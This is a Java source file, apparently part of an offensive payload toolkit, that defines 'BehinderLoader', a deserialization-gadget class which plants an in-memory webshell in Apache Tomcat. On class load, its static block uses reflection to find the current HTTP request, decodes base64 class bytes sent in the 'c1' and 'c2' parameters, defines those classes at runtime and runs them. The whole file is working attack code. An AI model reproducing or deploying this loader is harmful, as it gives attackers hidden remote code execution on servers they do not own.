package cn.safe6.payload.memshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Response;
import org.apache.coyote.Request;
import org.apache.coyote.RequestInfo;
import sun.misc.BASE64Decoder;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.List;

public class BehinderLoader extends AbstractTranslet {

    public static Object getField(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while(var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 != null) {
            var2.setAccessible(true);
            return var2.get(var0);
        } else {
            throw new NoSuchFieldException(var1);
        }
    }

    public void transform(DOM var1, SerializationHandler[] var2) throws TransletException {
    }

    public void transform(DOM var1, DTMAxisIterator var2, SerializationHandler var3) throws TransletException {
    }

    //此处除了用静态代码块，还可以用requestInitialized方法

    static {
        try {
            boolean var0 = false;
            Thread[] var1 = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");

            for(int var2 = 0; var2 < var1.length; ++var2) {
                Thread var3 = var1[var2];
                if (var3 != null) {
                    String var4 = var3.getName();
                    if (!var4.contains("exec") && var4.contains("http")) {
                        Object var5 = getField(var3, "target");
                        Object var6 = null;
                        if (var5 instanceof Runnable) {
                            try {
                                var6 = getField(getField(getField(var5, "this$0"), "handler"), "global");
                            } catch (NoSuchFieldException var22) {
                                var22.printStackTrace();
                            }
                        }

                        if (var6 != null) {
                            List var7 = (List)getField(var6, "processors");
                            var2 = 0;
                            if (var2 < var7.size()) {
                                RequestInfo var8 = (RequestInfo)var7.get(var2);
                                Request var9 = (Request)getField(var8, "req");
                                org.apache.catalina.connector.Request var10 = (org.apache.catalina.connector.Request)var9.getNote(1);
                                Response var11 = var10.getResponse();
                                HttpSession var12 = var10.getSession();

                                try {
                                    String var13 = var10.getParameter("c1");
                                    byte[] var14 = (new BASE64Decoder()).decodeBuffer(var13);
                                    Method var15 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                                    var15.setAccessible(true);

                                    Class var16 = (Class)var15.invoke(BehinderLoader.class.getClassLoader(), var14, new Integer(0), new Integer(var14.length));
                                    String var17 = var10.getParameter("c2");
                                    byte[] var18 = (new BASE64Decoder()).decodeBuffer(var17);
                                    Method var19 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                                    var19.setAccessible(true);
                                    Class var20 = (Class)var19.invoke(BehinderLoader.class.getClassLoader(), var18, new Integer(0), new Integer(var18.length));
                                    var20.getConstructor(var16).newInstance(var16.getConstructor(ServletRequest.class, ServletResponse.class).newInstance(var10, var11)).equals(new Object[]{var10, var11, var12, var16.getConstructor(ServletRequest.class, ServletResponse.class).newInstance(var10, var11)});
                                } catch (Exception var21) {
                                    var21.printStackTrace();
                                }

                                var0 = true;
                            }
                        }
                    }
                }

                if (var0) {
                    break;
                }
            }
        } catch (Exception var23) {
            var23.printStackTrace();
        }

    }
}
